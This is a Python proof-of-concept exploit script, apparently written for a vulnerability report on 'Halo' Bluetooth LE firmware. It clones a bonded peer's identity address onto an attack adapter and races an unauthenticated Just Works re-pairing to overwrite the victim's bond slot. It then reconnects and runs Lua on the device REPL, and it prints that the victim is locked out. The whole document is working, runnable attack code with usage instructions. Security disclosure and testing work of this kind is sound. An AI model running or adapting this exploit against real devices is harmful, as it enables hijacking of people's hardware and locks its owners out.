#!/usr/bin/env python3
"""
S-0002 PoC: bond slot takeover via identity-address spoofing + unauthenticated re-pair.

Clones a bonded peer's public/static identity address onto the attack adapter,
connects to the Halo, and immediately initiates a fresh Just Works pairing, racing
the LTK encryption failure. On vulnerable firmware the victim's bond slot is
overwritten with the attacker's keys (see ble_security.c on_keys_received/on_paired).

Requirements: BlueZ, adapter that accepts "btmgmt public-addr" (or bdaddr fallback),
bleak >= 0.22. Run with sudo.

    sudo python3 takeover.py --victim AA:BB:CC:DD:EE:FF --halo C0:59:94:11:22:33

After success, reconnect as the attacker and ping the Lua REPL to prove privilege.
The adapter's original address is restored automatically.
"""
from __future__ import annotations

import argparse
import asyncio
import re
import subprocess
import sys

try:
    from bleak import BleakClient
    from bleak.exc import BleakError
except ImportError:
    print("pip install bleak  (or use the uv shebang variant in this folder)")
    sys.exit(2)

ADDR_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def sh(*args: str, check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(args, capture_output=True, text=True, check=check)


def get_adapter_addr(adapter: str) -> str:
    out = sh("btmgmt", "-i", adapter, "info").stdout
    m = re.search(r"addr ([0-9A-F:]{17})", out)
    if not m:
        raise RuntimeError(f"cannot read {adapter} address:\n{out}")
    return m.group(1)


def set_adapter_addr(adapter: str, addr: str | None) -> None:
    sh("btmgmt", "-i", adapter, "power", "off", check=False)
    if addr is not None:
        r = sh("btmgmt", "-i", adapter, "public-addr", addr, check=False)
        if r.returncode != 0:
            r = sh("bdaddr", "-i", adapter, addr, check=False)
        if r.returncode != 0:
            raise RuntimeError(
                f"cannot set {adapter} identity address to {addr}.\n"
                "Adapter does not support public-addr override — see hack.md "
                "(CSR8510 clone + bdaddr is the reliable path)."
            )
    sh("btmgmt", "-i", adapter, "power", "on", check=False)


async def attempt(halo: str, adapter: str, timeout: float) -> bool:
    """One takeover attempt. True if pairing completed (slot overwritten)."""
    try:
        async with BleakClient(
            halo, adapter=adapter, timeout=timeout,
            # bleak maps this onto BlueZ; connection itself may already trigger
            # BlueZ auto-pairing when it sees 'key missing' — both paths count.
        ) as client:
            print(f"[*] Connected as spoofed peer; forcing immediate SMP pairing")
            await client.pair(protection_level=2)  # Just Works: no interaction
            print("[+] Pairing completed before encryption failure dropped us")
            return True
    except BleakError as e:
        msg = str(e)
        if "authentication" in msg.lower() or "insufficient" in msg.lower():
            print("[+] Pairing REJECTED by firmware — patched?")
            return False
        print(f"    attempt failed ({type(e).__name__}: {e})")
        return False
    except Exception as e:  # connection dropped mid-race: expected while vulnerable
        print(f"    race lost ({type(e).__name__}: {e})")
        return False


async def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", required=True,
                    help="identity address (public/static) of the bonded peer to overwrite")
    ap.add_argument("--halo", required=True, help="Halo static address")
    ap.add_argument("--adapter", default="hci0")
    ap.add_argument("--attempts", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()

    if not ADDR_RE.match(args.victim) or not ADDR_RE.match(args.halo):
        print("addresses must look like AA:BB:CC:DD:EE:FF")
        return 2

    original = get_adapter_addr(args.adapter)
    print(f"[*] Adapter {args.adapter} real address {original}")

    won = False
    try:
        set_adapter_addr(args.adapter, args.victim)
        print(f"[*] Adapter {args.adapter} identity address set to {args.victim}")

        for i in range(1, args.attempts + 1):
            print(f"[*] Attempt {i}/{args.attempts}: connect to {args.halo}")
            if await attempt(args.halo, args.adapter, args.timeout):
                won = True
                break
            await asyncio.sleep(0.5)

        if not won:
            print("[-] No takeover in", args.attempts, "attempts")
            return 3

        # Prove the slot now holds OUR keys: reconnect (pairing window NOT open,
        # we connect as the spoofed-but-now-ours identity) and ping the REPL.
        try:
            import brilliant_ble  # type: ignore  # optional; fallback below
            from brilliant_ble import BrilliantBle

            halo = BrilliantBle()
            await halo.connect(address=args.halo)  # type: ignore[attr-defined]
            await halo.send_break_signal()
            got: list[str] = []
            halo._user_print_response_handler = got.append
            await halo.send_lua("print('repl-ok ' .. frame.FIRMWARE_VERSION)",
                                await_print=True)
            await halo.send_reset_signal()
            await halo.disconnect()
            print(f"[+] Attacker reconnect: encrypted link up, REPL says: {got}")
        except ImportError:
            # Without the vendor library, any reconnection at all already proves
            # the slot now matches our keys (encryption succeeds).
            async with BleakClient(args.halo, adapter=args.adapter,
                                   timeout=args.timeout) as c:
                print(f"[+] Attacker reconnect: link up, MTU={c.mtu_size}")
        print("[VULNERABLE] Bond slot takeover succeeded; victim is locked out")
        return 1
    finally:
        try:
            set_adapter_addr(args.adapter, original)
            print(f"[*] Adapter address restored to {original}")
        except Exception as e:
            print(f"[!] RESTORE YOUR ADAPTER MANUALLY to {original}: {e}")


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
